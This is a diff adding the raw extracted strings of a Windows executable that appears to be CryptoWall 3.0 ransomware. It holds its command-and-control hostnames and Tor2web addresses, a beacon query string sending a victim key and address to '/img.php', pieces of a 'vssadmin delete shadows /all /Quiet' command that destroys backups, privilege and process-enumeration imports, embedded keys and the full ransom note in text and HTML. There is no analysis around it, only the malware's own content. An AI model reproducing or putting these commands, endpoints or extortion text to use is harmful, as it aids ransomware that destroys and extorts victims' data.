@@ -1,0 +1,1458 @@
+!This program cannot be run in DOS mode.
+Rich
+.text
+`.rdata
+@.data
+.rsrc
+PQRh
+PQRh
+D$Af
+u!Vh
+VjAh
+L$(j Q
+T$(j R
+QWRSP
+WRSP
+T$Tj R
+L$LQ
+RPVV
+u#hw
+jAhw
+D$}f
+L$dj Q
+T$dj R
+L$ Q
+T$(RSQWP
+T$ R
+T$(R
+SRWP
+SjAh
+j h\
+j h|
+SVWRQ
+QRVV
+D$]f
+L$$j
+T$Lj R
+D$<P
+9|$8r
+L$$Q
+BRPh
+AQWV
+sBSW
+SVW;P
+|$$t@;
+;t$ w
++L$ 
+(;L$$w
+;t$ s
++t$ 
+L$,u
+y"SVW
+PSPQ
+PSPQ
+PSPQ
+PSPQ
+PSPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+SWVQ
+SWRV
+t$ ;
+;D$ s
+T$ ;
+;t$ s
+\$ ;
+;\$ s
+\$ +
++\$(
+T$ ;
+9D$$t
+9D$$w
+\$ +
++\$(
+T$ ;
+9D$$t
+9D$$w
+\$ +
++\$(
+T$ ;
+9D$$t
+9D$$w
+\$ +
++\$(
+T$ ;
+9D$$t
+9D$$w
+D$$;D$,t#
+T$,9T$$w
+W PR
+W0PR
+W8PR
+W8PR
+W PR
+W8PR
+HSVW
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PSPS
+PQPQ
+HSVW
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PSPS
+PQPQ
+9G(u
+G VP
+SW9F
+t]VW
+_^[]
+9C(u
+\$$u
+@VPW
+9t$ 
++T$ 
+D$tSRPP
+;D$(u
+;L$,u
+T$,R
+T$,RWVQP
+D$,PQRS
+L$4+
+|$@PW
+PSPW
+D$H3
+D$8P
+D$HP
+9|$Hs
+D$X;
+;D$@rv
+D$@9D$Xu
+9t$@r2
+D$<9D$Tw
+;|$8s
++|$8
+D$T;
+D$X;D$@s
+QSVR
+9W(u
+WRVVj
+D$$VP
+D$$RPS
+RVPQS
+PQSV
+T$ VR
+T$ PQVRj
+D$,_^[
+WQPR
+C$VW3
+9{(u
+C$9{$u
+9{(u
+SQVRj
+{ _^
+SV;G
+^[Y]
+SVW3
+Wu,I
+QSVW
+t!9]
+QPWVVj
+C$VW
+9C(u
+C S;
+{ _^
+WQVVj
+C$VW
+9C(u
+C S;
+{ _^
+N$1O
+C$VW
+9C(u
+C QW
+{ _^
+C$VW
+9C(u
+T$0S
+L$0QW
+j@WW
+T$0RWj
+SPWWj
+{ _^
+u"Pj
+VRPQ
+VRQP
+RPQW
+RSWS
+PWSS
+ SVW
+PVQR
+VPQS
+Vt-PSP
+9s(u
+t	;E
+L$$;N
+L$$;N
+D$ _^[
+_^[Y]
+_^[Y]
+L$(j
+L$4j
+D$(3
+D$8j
+D$,P3
+L$Lj
+L$<Q
+D$hVV
+L$0VQ
+|$8#
+L$Xj
+L$h3
+T$l3
+T$H3
+T$x3
+D$,3
+T$X3
+L$Dj
+T$LQ
+\$d3
+T$@j
+D$L3
+T$H3
+L$\j
+L$DQ
+T$TR
+|$X3
+D$`3
+6}/@
+%PF@
+T$`VR
+T$h#
+|$09^
+L$0u
+L$@j
+|$d3
+L$03
+T$du
+L$(j
+D$(3
+L$$Q
+D$tVV
+D$l3
+D$<3
+D$4PVV
+D$h3
+T$DR
+D$P3
+D$P3
+D$p3
+D$(j
+D$03
+T$$3
+D$8j
+D$$P
+L$|VV
+T$d+
+D$Hj
+D$4PVV
+6y/Gj
+%PF@
+|$@9^
+L$@u
+L$Xj
+T$Tu
+T$lRVV
+D$03
+D$83
+D$|3
+D$@3
+L$T3
+D$Xj
+D$4P
+L$dj
+L$DQ
+D$$j
+T$,j
+T$$R
+D$Tj
+D$4P
+T$tVV
+T$Hj
+T$DR
+D$T3
+D$$3
+D$@PF@
+%PF@
+LSVW
+\$ 3
+D$D3
+L$0VQ
+T$8#
+WjOh
+SjOh
+t+;C
+T$$;
+9K(u
+PQVS
+PQNV
+QPPP
+RWPQ
+VSPQ
+PVQR
+WPQR
+_^[Y]
+t)VSW
+_^[Y]
+_^[Y]
+u,@;G
+_^[Y]
+_^[Y]
+u&QR
+QSVW
+_^[Y]
+VRQP
+_^[Y]
+h|&C
+VRj@
+u$9^
+L$2Q
+D$"f
+L$@QV
+SVW3
+h *C
+h8*C
+h8*C
+h<*C
+u;hX*C
+u,ht*C
+ht*C
+PQSV
+u4Sj
+PQRV
+_^[]
+9C(u
+t$ SR
+T$$P
+_^[]
+_^[]
+txVW
+9_(u
+WQRVP
+tq9E
+WSPV
+HHQVV
+te9E
+HHQVV
+u!RW
+PRVS
+FHSP
+RSPWj
+NtQV
+VtWR
+QWWV
+OHQP
+u	9u
+OtQSW
+OtQS
+t$$;
+9s(u
+OtQRW
+GtPQ
+t$,WV
+sHVP
+QWWS
+sHVP
+QWWS
+sHVP
+9q0u
+RWWS
+,SPW
+WSVR
+^_[]
+AdV3
+t$ ;
+9w(u
+t$$W
+,RVS
+sHVP
+WQVS
+QVRS
+CHPQVR
+D$ _^[
+T$4;
+PSVW
+u9SV
+u-WV
+,PWV
+D$ SW
+,PWWV
+T$,SW
+|$,W
+,PWV
+L$$SW
+,PWWV
+D$,W
+|$<PW
+D$$P
+D$$PP
+D$,QPP
+SQRP
+D$$SQ
+T$(SPRP
+D$ SQ
+T$ R
+D$4_^[
+,SVW
+t$4;
+uGRW
+9s(u
+F,PQW
+t$(WQV
+,PVW
+SVVW
+OtQVVW
+SRWV
+D$$SW
+|$0PWV
+SWVQ
+D$,PV
+SVQVR
+D$4_^[
+$SVW
+9C(u
+SVPW
+T$$SVQRW
+PVVW
+GtPQVW
+tWPP
+PVVW
+D$,_^[
+AdVW
+uDWS
+9G(u
+,PVS
+,QPS
+D$ WQ
+,PVVS
+t$$VVS
+D$ WV
+D$(_^[
+9_(u
+u4WVSR
+$SV3
+t$,9u
+9s(u
+WHRPP
+RPPW
+T$,P
+D$ RPW
+,VPW
+SVPPW
+D$,_^[
+HQVVj
+LSV3
+D$<;
+L$4;
+|$D;
+D$@;Q
+D$$;
+D$@;O
+D$(;
+D$@;O
+T$PWR
+T$@RP
+t$<WRP
+D$4;
+D$@;O
+D$4;
+D$@;O
+t$8QWR
+D$4;
+D$@;O
+D$Hj
+D$<W
+VSQRW
+VSQRW
+WjPh
+^_[]
+ODVQ
+GDVP
+O@Qh
+tL9^
+u,_[]
+_^[]
+_@_^
+PSWR
+RPWSQ
+VPWSQ
+SVW3
+|$`;
+9} u
+D$4;
+t$D;
+T$<RQ
+\$$;
+T$X9F
+T$Pj
+L$P;
+D$8;
+T$(9\$
+?;|$,v
+;D$8
+T$$RQ
+L$$;L$,w/
+|$HH
+D$d9D$
+>9|$$
+)|$$
+L$PRQP
+;D$,v
+;D$0
+;D$8r
+;|$X
+t$4;
+T$DRQ
+D$X;
+] SRVP
+D$XI
+D$X;
+;D$8
+L$(3
+L$(@;
+D$ RPQ
+D$,H
+;D$LtC
+9L$L
+VQQR
+;D$0
+T$ R
+D$`_^[
+SVWu
+D$,T,C
+D$$\,C
+D$0L,C
+h(+C
+D$(3
+L$`RP
+D$`h
+h`,C
+D$If
+L$T+
+D$Tg
+D$\r
+D$`:
+D$4P
+}#jPQR
+L$(Q
+T$$R
+RPPO
+V	0P
+QPPO
+gfff
+T$ R
+T$PV
+L$@h
+T$8R
+T$Pj
+D$$P
+L$DQ
+T$4R
+D$LP
+L$0Q
+L$<Pj
+L$0Q
+uCWh
+tSVW3
+D$|I
+gfff
+h@.C
+9|$Ht
+D$@+D$@
+D$XP
+T$\R
+L$xh
+L$TQ
+T$lR
+L$hQ
+L$tPj
+;L$@}
+;T$@}
+;t$@}
+L$D}
+D$PP
+T$dR
+L$tPj
+T$tR
+D$,W
+hX.C
+ht.C
+T$$Rj
+T$$R
+D$$Pj
+$jDQ
+T$$R
+T$,S
+D$,h,/C
+L$,h</C
+T$DR
+Pj@Q
+T$4j
+T$0j
+hP/C
+D$DP
+Qj@R
+D$4j
+L$,Q
+h(0C
+h80C
+hH0C
+hX0C
+hh0C
+9\$8
+9\$,
+9\$(
+9\$P
+9\$D
+9\$L
+9\$@
+9\$H
+9\$<
+9\$0t
+T$`RP
+L$`QR
+L$pQR
+D$pPQ
+L$$Q
+T$$R
+T$\j
+F\ _^
+x@VW
+PQVS3
+s^[]
+_^[]
+Ph0GC
+h@GC
+hhGC
+Vj<P
+Sh GC
+P0QW
+h,HC
+h|&C
+hLHC
+RhpHC
+w$t0
+hx0C
+QVVj
+QRVj
+h4IC
+h@IC
+L$|Qh
+T$$j
+L$hQ
+T$$Rj
+D$hj
+D$HD
+h\IC
+hlIC
+Qh|IC
+h8JC
+h8JC
+SVWj
+tASW
+D$03
+D$`f
+L$0j
+T$<R
+D$<SP
+D$$j
+D$T(
+D$>6
+L$6f
+T$$RV
+L$DQV
+RWSV
+SVW3
+PSSSSSSh 
+PWVj
+h,KC
+^0Wj
+v	_^3
+L$dQRP
+D$p 
+D$40
+D$<0
+D$,P
+Ph8KC
+T$ R
+L$|Q
+T$|R
+~h[_
+ tMv
+~\[_
+QWSRQ
+WSQV
+USVW
+_^[]
+USVW
+_^[]1
+USVW
+E(3E
+E,QR
+E@3E,
+EDQR
+EX3ED
+E\QR
+Ep3E\
+EtQR
+_^[]1
+USVW
+E03E
+E43E
+E83E
+E<QR
+EP3E4
+ET3E8
+EX3E<
+E\QR
+Ep3ET
+Et3EX
+Ex3E\
+E|QR
+_^[]1
+ t"=
+USVW
+_^[]
+USVW
+USVW
+USVW
+_^[]1
+ t"=
+h$OC
+h`OC
+ SW3
+8CSVh
+8"u]
+8"u'
+_^[]
+VW9]
+_^[]
+t"Ou
+_^[]
+t'Ou
+YY;E
+_^[]
+t)Ou
+SSSSS
+_^[]
+ SW3
+8CSVhDhB
+8"uY
+WVhDhB
+8"u%
+_^[]
+woVW
+f9;u 
+@uoW
+uTVWh\
+jXh PC
+YQPVh
+PPPPP
+j0Xf
+RPWS
+80tS
+j Yf
+YYt/
+h@PC
+t&:a
+h`PC
+_^[]
+Y_^[]
+Fpt"
+ht.C
+Y;=X
+Wht.C
+@u^V
+t%HHt
+HHt$HHt
+RPWS
+90tW
+?If90t
+YYt.
+@u^V
+t$HHt
+HHt$HHt
+RPWS
+90tX
+YYt.
+PPPPP
+<v*V
+^SSSSS
+AWf;
+tRHtC
+tEHt0
+u%	U
+f9>t
+f9>t
+>=uu
+f9>t
+f9>t
+h0QC
+Y__^[
+9csm
+URPQQh
+L$,3
+UVWS
+[_^]
+SVWj
+_^[]
+uNSW
+j@j ^V
+SWf9M
+j@j 
+hPQC
+~,WPV
+hpQC
+98t^
+tVPV
+t/9U
+t!Ht
+_^[]
+Y_^[
+Y_^[
+8csm
+ w	f
+"u	3
+tAVWP
+Y[_^
+PPPPP
+8"u8
+t	j\Yf
+t$9U
+QQSVWh
+h8RC
+VVhU
+hXRC
+u,9E
+~%9M
+QVj	
+r 8^
+v	N+D$
+9]$u
+9](SS
+t"SS9] u
+9] SS
+v4;5
+vL;5
+PPPPPPPP
+PPPPPPPP
+QSWVj
+u}h$
+hxRC
+tCHt(Ht 
+3t(;
+SSSSS
+t(9}
+SW9E
+t?f;
+Vuy3
+SVWUj
+]_^[
+;t$,v-
+UQPXY]Y[
+_^[]
+j@j 
+oV f
+o^0f
+of@f
+onPf
+ov`f
+o~pf
+FGIu
+X^_]
+FGIu
+SVW3
+Ht%C
+Ht(f
+_^[u
+QQSVWd
+QSVW
+@_^]
+=RCC
+=MOC
+=csm
+hPVC
+8csm
+hxVC
+9csm
+~A;L
+>csm
+taSV
+YYPV
+t)SV
+h8WC
+Hu4j
+=MOC
+t*=RCC
+;7|G;p
+9>u&
+hTWC
+tR99u2
+r,9Y
+@_^[]
+Rw.ASw
+@SwJ@Sw
+CSw$
+FSw?wTw
+X0Xr
+hw}Phw|
+gwIDhw!Thwb
+dhwLThw)
+hw{Dhw
+I~v\
+}v}L~v
+September
+August
+July
+June
+April
+March
+February
+January
+Saturday
+Friday
+Thursday
+Wednesday
+Tuesday
+Monday
+Sunday
+FlsFree
+FlsSetValue
+FlsGetValue
+FlsAlloc
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+(null)
+( 8PX
+700WP
+`h````
+xpxxxx
+('8PW
+700PP
+`h`hhh
+xppwpp
+ Complete Object Locator'
+ Class Hierarchy Descriptor'
+ Base Class Array'
+ Base Class Descriptor at (
+ Type Descriptor'
+`local static thread guard'
+`managed vectorArrayList copy constructor iterator'
+`vectorArrayList vbase copy constructor iterator'
+`vectorArrayList copy constructor iterator'
+`dynamic atexit destructor for '
+`dynamic initializer for '
+`eh vectorArrayList vbase copy constructor iterator'
+`eh vectorArrayList copy constructor iterator'
+`managed vectorArrayList destructor iterator'
+`managed vectorArrayList constructor iterator'
+`placement delete[] closure'
+`placement delete closure'
+`omni callsig'
+ delete[]
+ new[]
+`local vftable constructor closure'
+`local vftable'
+`RTTI
+`udt returning'
+`copy constructor closure'
+`eh vectorArrayList vbase constructor iterator'
+`eh vectorArrayList destructor iterator'
+`eh vectorArrayList constructor iterator'
+`virtual displacement map'
+`vectorArrayList vbase constructor iterator'
+`vectorArrayList destructor iterator'
+`vectorArrayList constructor iterator'
+`scalar deleting destructor'
+`default constructor closure'
+`vectorArrayList deleting destructor'
+`vbase destructor'
+`string'
+`local static guard'
+`typeof'
+`vcall'
+`vbtable'
+`vftable'
+operator
+ delete
+ new
+__unaligned
+__restrict
+__ptr64
+__eabi
+__clrcall
+__fastcall
+__thiscall
+__stdcall
+__pascal
+__cdecl
+__based(
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz
+CAutoBN_CTX : BN_CTX_new() returned NULL
+CBigNum::operator= : BN_copy failed
+CBigNum conversion from unsigned long : BN_set_word failed
+EncodeBase58 : BN_div failed
+6A@string too long
+invalid string position
+vectorArrayList<T> too long
+bn\bn_ctx.c
+0123456789ABCDEF
+SHA-256
+vRQ>
+8STs
+LwH'
+RIPE-MD160
+ECDH
+?456789:;<=
+ !"#$%&'()*+,-./01230123456789ABCDEF
+Big Number
+bn\bn_lib.c
+bn\bn_mont.c
+bn\bn_print.c
+ecdh\ech_lib.c
+OpenSSL ECDH method
+ecdh\ech_ossl.c
+ec\ecp_smpl.c
+SECG curve over a 256 bit prime field
+ec\ec_key.c
+ec\ec_lib.c
+ec\ec_mult.c
+evp\digest.c
+Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0
+disclaimer_accepted = 1
+https://zpr5huq4bgmutfnf.onion.to
+https://zpr5huq4bgmutfnf.tor2web.org
+zpr5huq4bgmutfnf.onion.to
+zpr5huq4bgmutfnf.tor2web.org
+gfdkotriam.fo4j4wnq51hepa.com
+kosdfnure75.op1gifsd05mllk.com
+Ping
+Crypted
+Subject=%s&key=%s&addr=%s&size=%lld&version=%s&OS=%ld&ID=%d&gate=G%d&ip=%s&inst_id=%X%X%X%X%X%X%X%X
+/img.php?%s
+---!!!INSERTED!!!---
+....................
+NetStatisticsGet
+NetApiBufferFree
+CryptAcquireContextW
+CryptGenRandom
+CryptReleaseContext
+CreateToolhelp32Snapshot
+CloseToolhelp32Snapshot
+Heap32First
+Heap32Next
+Heap32ListFirst
+Heap32ListNext
+Process32First
+Process32Next
+Thread32First
+Thread32Next
+<html><title>CryptoWall 3.0</title><style>a { color:green; }.tb {  background:white; border-style:solid; border-width:1px; padding:3px; border-color:lime; }.ttl { font-size:13px; color:880000; }</style><body style="background:#33CCFF;">  <center><div style="text-align:left; font-family:Arial; font-size:13px; line-height:20px; margin-top:10px; width:800px; background:#F4F4F4; padding:20px; border-style:solid; border-width:5px; border-color:#BABABA;"><b><font class="ttl">What happened to your files?</b></font><br> <font style="font-size:13px;">All of your files were protected by a strong encryption with RSA-2048 using CryptoWall 3.0.<br> More information about the encryption RSA-2048 can be found here: <a href="http://en.wikipedia.org/wiki/RSA_(cryptosystem)" target="_blank">http://en.wikipedia.org/wiki/RSA_(cryptosystem)</a><br></font><br><b><font class="ttl">What does this mean?</b></font><br><font style="font-size:13px;">This means that the structure and data within your files have been irrevocably changed, you will not be able to work<br> with them, read them or see them, it is the same thing as losing them forever, but with our help, you can restore them.</font><br><br><b><font class="ttl">How did this happen?</b></font>  <br>    <font style="font-size:13px;">  Especially for you, on our server was generated the secret key pair RSA-2048 - public and private.<br>All your files were encrypted with the public key, which has been transferred to your computer via the Internet.<br> Decrypting of YOUR FILES is only possible with the help of the private key and decrypt program, which is on our SECRET SERVER!!!.</font><br><br><b><font class="ttl">What do I do?</b></font> <br><font style="font-size:13px;">Alas, if you do not take the necessary measures for the specified time then the conditions for obtaining the private key will be changed.<br> 	If you really need your data, then we suggest you do not waste valuable time searching for other solutions because they do not exist.</font><br><br><div class="tb" style="color:#880000; font-size:13px; border-width:3px;">For more specific instructions, please visit your personal home page, there are a few different addresses pointing to your page below: <hr><b>1.<a href="http://kosdfnure75.op1gifsd05mllk.com/%S"   target="_blank">http://kosdfnure75.op1gifsd05mllk.com/%S</a></b><br><b>2.<a href="http://gfdkotriam.fo4j4wnq51hepa.com/%S"   target="_blank">http://gfdkotriam.fo4j4wnq51hepa.com/%S</a></b><br><b>3.<a href="https://zpr5huq4bgmutfnf.onion.to/%S" target="_blank">https://zpr5huq4bgmutfnf.onion.to/%S</a></b><br></div><br><div class="tb" style="font-size:13px; border-color:#880000;">If for some reasons the addresses are not available, follow these steps: <hr>1. Download and install tor-browser: <a href="http://www.torproject.org/projects/torbrowser.html.en" target="_blank">http://www.torproject.org/projects/torbrowser.html.en</a><br>2. After a successful installation, run the browser and wait for initialization.<br>3. Type in the address bar: <font style="font-weight:bold; color:#009977;">zpr5huq4bgmutfnf.onion/%S</font><br>4. Follow the instructions on the site.</div><br><br><b>IMPORTANT INFORMATION:</b><br><div class="tb" style="width:790px;">Your Personal PAGE: <b><a href="http://kosdfnure75.op1gifsd05mllk.com/%S" target="_blank">http://kosdfnure75.op1gifsd05mllk.com/%S</a></b><br><!------sadfsafasdfasdfsadf -->Your Personal PAGE (using TOR): <font style="font-weight:bold; color:#009977;">zpr5huq4bgmutfnf.onion/%S</font><br>Your personal code (if you open the site (or TOR 's) directly): <font style="font-weight:bold; color:#770000;">%S</font><br></div></div></center></body></html>
+______!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!______________
+What happened to your files ?
+All of your files were protected by a strong encryption with RSA-2048 using CryptoWall 3.0.
+More information about the encryption keys using RSA-2048 can be found here: http://en.wikipedia.org/wiki/RSA_(cryptosystem)
+What does this mean ?
+This means that the structure and data within your files have been irrevocably changed, you will not be able to work with them, read them or see them,
+it is the same thing as losing them forever, but with our help, you can restore them.
+How did this happen ?
+Especially for you, on our server was generated the secret key pair RSA-2048 - public and private.
+All your files were encrypted with the public key, which has been transferred to your computer via the Internet.
+Decrypting of your files is only possible with the help of the private key and decrypt program, which is on our secret server.
+What do I do ?
+Alas, if you do not take the necessary measures for the specified time then the conditions for obtaining the private key will be changed.
+If you really value your data, then we suggest you do not waste valuable time searching for other solutions because they do not exist.
+For more specific instructions, please visit your personal home page, there are a few different addresses pointing to your page below:
+1.http://kosdfnure75.op1gifsd05mllk.com/%S
+2.http://gfdkotriam.fo4j4wnq51hepa.com/%S
+3. https://zpr5huq4bgmutfnf.onion.to/%S
+If for some reasons the addresses are not available, follow these steps:
+1. Download and install tor-browser: http://www.torproject.org/projects/torbrowser.html.en 
+2. After a successful installation, run the browser and wait for initialization.
+3. Type in the address bar: zpr5huq4bgmutfnf.onion/%S 
+4. Follow the instructions on the site.
+IMPORTANT INFORMATION:
+Your personal page: http://kosdfnure75.op1gifsd05mllk.com/%S 
+Your personal page (using TOR): zpr5huq4bgmutfnf.onion/%S 
+Your personal identification number (if you open the site (or TOR 's) directly): %S
+pp	Q
+delete 
+shadows /all /Quiet 
+open
+runas
+vssadmin.exe
+Wow64DisableWow64FsRedirection
+Wow64RevertWow64FsRedirection
+SeDebugPrivilege
+PsLookupProcessByProcessId
+gSharedInfo
+bad exception
+PathFindFileNameW
+SHLWAPI.dll
+EnumProcesses
+GetProcessImageFileNameW
+PSAPI.DLL
+memmove
+wcsstr
+strstr
+NtQuerySystemInformation
+RtlGetVersion
+NtQueryInformationProcess
+_vsnwprintf
+ntdll.dll
+GetFileSize
+FindFirstFileW
+SetFilePointer
+HeapFree
+GetProcessHeap
+WriteFile
+GlobalAlloc
+Sleep
+GetFileAttributesW
+ReadFile
+CreateFileW
+ExitThread
+FlushFileBuffers
+GetLastError
+GlobalFree
+FindClose
+FindNextFileW
+CloseHandle
+DeleteFileW
+SetFileAttributesW
+GetVolumeInformationW
+GlobalMemoryStatus
+FreeLibrary
+QueryPerformanceCounter
+GetTickCount
+LoadLibraryW
+GetVersionExW
+GetProcAddress
+GetCurrentProcessId
+ExitProcess
+GetEnvironmentVariableW
+CreateMutexW
+CreateProcessW
+GetCurrentProcess
+WaitForSingleObject
+GetModuleHandleW
+OpenProcess
+CopyFileW
+TerminateProcess
+GetModuleFileNameW
+GetSystemDirectoryA
+SetThreadPriority
+GetStartupInfoW
+InterlockedExchange
+SetLastError
+LocalAlloc
+LoadLibraryExA
+VirtualProtect
+GetShortPathNameW
+LocalFree
+CreateThread
+ExpandEnvironmentStringsW
+KERNEL32.dll
+PostMessageW
+DispatchMessageW
+DefWindowProcW
+CreateWindowExW
+SetWindowLongW
+ReleaseDC
+LoadIconW
+RegisterClassExW
+TranslateMessage
+GetDC
+DrawTextA
+UnregisterClassW
+GetMessageW
+USER32.dll
+CreateCompatibleBitmap
+CreateCompatibleDC
+SelectObject
+DeleteObject
+DeleteDC
+GetStockObject
+CreateFontW
+SetBkMode
+GetDIBits
+SetTextColor
+GDI32.dll
+RegCreateKeyExW
+RegQueryValueExW
+RegFlushKey
+RegCloseKey
+RegSetValueExW
+OpenProcessToken
+GetSidSubAuthority
+GetTokenInformation
+LookupPrivilegeValueA
+AllocateAndInitializeSid
+FreeSid
+CheckTokenMembership
+AdjustTokenPrivileges
+ADVAPI32.dll
+ShellExecuteExW
+SHGetFolderPathW
+ShellExecuteExA
+ShellExecuteW
+SHGetSpecialFolderPathW
+SHELL32.dll
+CoCreateInstance
+CoInitializeEx
+ole32.dll
+WNetCloseEnum
+WNetOpenEnumW
+WNetEnumResourceW
+MPR.dll
+InternetOpenW
+InternetConnectA
+InternetOpenUrlW
+InternetReadFile
+HttpOpenRequestA
+InternetSetCookieA
+HttpSendRequestA
+InternetOpenA
+InternetCloseHandle
+WININET.dll
+RtlUnwind
+GetSystemTimeAsFileTime
+DecodePointer
+HeapReAlloc
+GetCommandLineW
+HeapSetInformation
+RaiseException
+HeapCreate
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+IsDebuggerPresent
+EncodePointer
+GetCPInfo
+InterlockedIncrement
+InterlockedDecrement
+GetACP
+GetOEMCP
+IsValidCodePage
+TlsAlloc
+TlsGetValue
+TlsSetValue
+TlsFree
+GetCurrentThreadId
+LCMapStringW
+GetStdHandle
+EnterCriticalSection
+LeaveCriticalSection
+InitializeCriticalSectionAndSpinCount
+SetHandleCount
+GetFileType
+DeleteCriticalSection
+FreeEnvironmentStringsW
+GetEnvironmentStringsW
+WideCharToMultiByte
+GetConsoleCP
+GetConsoleMode
+MultiByteToWideChar
+HeapSize
+GetStringTypeW
+SetStdHandle
+WriteConsoleW
+IsProcessorFeaturePresent
+SetEndOfFile
+_aullshr
+_allshl
+_alldiv
+00P`00P
+++}V++}
+&&jL&&j
+66Zl66Z
+??A~??A
+44\h44\
+11Sb11S
+##eF##e
+''iN''i
+,,tX,,t
+;;Mv;;M
+)){R)){
+//q^//q
+  `@  `
+99Kr99K
+33Uf33U
+<<Dx<<D
+88Hp88H
+!!cB!!c
+==Gz==G
+""fD""f
+**~T**~
+22Vd22V
+::Nt::N
+$$lH$$l
+77Yn77Y
+%%oJ%%o
+..r\..r
+>>B|>>B
+55_j55_
+((xP((x
+--wZ--w
+R~AeS~Ae	
+j:'^
++NpHhXpHh
+@CFg
+lZrNlZr
+X6-9'6-9
+[TE$6.:$6.
+ ?ZwKiZwK
+&O\r
+gDf;
+?uV},
+bT~FbT~F
+*?#1*?#
+f1tN
+JFeQ
++8$4,8$4
+%w(<I
+!Hl\tHl\
+.?AVlogic_error@std@@
+.?AVlength_error@std@@
+.?AVout_of_range@std@@
+.?AVtype_info@@
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+                        
+        
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+.?AVruntime_error@std@@
+.?AVexception@std@@
+.?AVbignum_error@@
+2.0.4a
+twervbssdgdfgsdgsdf123412341412
+'olJ|
+.?AVbad_alloc@std@@
+.?AVbad_exception@std@@
+?2eQ:
+E9SYo
+x\>Bj
+#B3-
+1nRc(
+rFX2
+Lm]p
+jSiX#/
+UELg
+gf`s
+vu&x
+QZ]aF
+2fz2N
+171u9Zh6s9K2a7dvH7xKXkduWXdGJwsYnu
+17EBCB3EEFD8F3D89480653A303E2E7F3E517915F1E870DA378FCA11CF7199A8DA1883912A2EFC384FC2DA9035B2784C49EE5DB2722C60039B8B56F715D29567
+17EBCB3EEFD8F3D89480653A303E2E7F3E517915F1E870DA378FCA11CF7199A8DA1883912A2EFC384FC2DA9035B2784C49EE5DB2722C60039B8B56F715D29567
+8H<9
+Z\`<
+T(MA
+578B404972346FB518406B5AE67E91545B4197A4AC638C9DE8B222460B333366606C3AF2A26A81BB1C0FBF3389822542577242D888ACF20558E10B7FF54AF9A1
+131.254.153.6
+______!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!______________
+What happened to your files ?
+All of your files were protected by a strong encryption with RSA-2048 using CryptoWall 3.0.
+More information about the encryption keys using RSA-2048 can be found here: http://en.wikipedia.org/wiki/RSA_(cryptosystem)
+What does this mean ?
+This means that the structure and data within your files have been irrevocably changed, you will not be able to work with them, read them or see them,
+it is the same thing as losing them forever, but with our help, you can restore them.
+How did this happen ?
+Especially for you, on our server was generated the secret key pair RSA-2048 - public and private.
+All your files were encrypted with the public key, which has been transferred to your computer via the Internet.
+Decrypting of your files is only possible with the help of the private key and decrypt program, which is on our secret server.
+What do I do ?
+Alas, if you do not take the necessary measures for the specified time then the conditions for obtaining the private key will be changed.
+If you really value your data, then we suggest you do not waste valuable time searching for other solutions because they do not exist.
+For more specific instructions, please visit your personal home page, there are a few different addresses pointing to your page below:
+1.http://kosdfnure75.op1gifsd05mllk.com/444AA12CB4276DEB
+2.http://gfdkotriam.fo4j4wnq51hepa.com/444AA12CB4276DEB
+3. https://zpr5huq4bgmutfnf.onion.to/444AA12CB4276DEB
+If for some reasons the addresses are not available, follow these steps:
+1. Download and install tor-browser: http://www.torproject.org/projects/torbrowser.html.en 
+2. After a successful installation, run the browser and wait for initialization.
+3. Type in the address bar: zpr5huq4bgmutfnf.onion/444AA12CB4276DEB 
+4. Follow the instructions on the site.
+IMPORTANT INFORMATION:
+Your personal page: http://kosdfnure75.op1gifsd05mllk.com/444AA12CB4276DEB 
+Your personal page (using TOR): zpr5huq4bgmutfnf.onion/444AA12CB4276DEB 
+Your personal identification number (if you open the site (or TOR 's) directly): 444AA12CB4276DEB
+<html><title>CryptoWall 3.0</title><style>a { color:green; }.tb {  background:white; border-style:solid; border-width:1px; padding:3px; border-color:lime; }.ttl { font-size:13px; color:880000; }</style><body style="background:#33CCFF;">  <center><div style="text-align:left; font-family:Arial; font-size:13px; line-height:20px; margin-top:10px; width:800px; background:#F4F4F4; padding:20px; border-style:solid; border-width:5px; border-color:#BABABA;"><b><font class="ttl">What happened to your files?</b></font><br> <font style="font-size:13px;">All of your files were protected by a strong encryption with RSA-2048 using CryptoWall 3.0.<br> More information about the encryption RSA-2048 can be found here: <a href="http://en.wikipedia.org/wiki/RSA_(cryptosystem)" target="_blank">http://en.wikipedia.org/wiki/RSA_(cryptosystem)</a><br></font><br><b><font class="ttl">What does this mean?</b></font><br><font style="font-size:13px;">This means that the structure and data within your files have been irrevocably changed, you will not be able to work<br> with them, read them or see them, it is the same thing as losing them forever, but with our help, you can restore them.</font><br><br><b><font class="ttl">How did this happen?</b></font>  <br>    <font style="font-size:13px;">  Especially for you, on our server was generated the secret key pair RSA-2048 - public and private.<br>All your files were encrypted with the public key, which has been transferred to your computer via the Internet.<br> Decrypting of YOUR FILES is only possible with the help of the private key and decrypt program, which is on our SECRET SERVER!!!.</font><br><br><b><font class="ttl">What do I do?</b></font> <br><font style="font-size:13px;">Alas, if you do not take the necessary measures for the specified time then the conditions for obtaining the private key will be changed.<br> 	If you really need your data, then we suggest you do not waste valuable time searching for other solutions because they do not exist.</font><br><br><div class="tb" style="color:#880000; font-size:13px; border-width:3px;">For more specific instructions, please visit your personal home page, there are a few different addresses pointing to your page below: <hr><b>1.<a 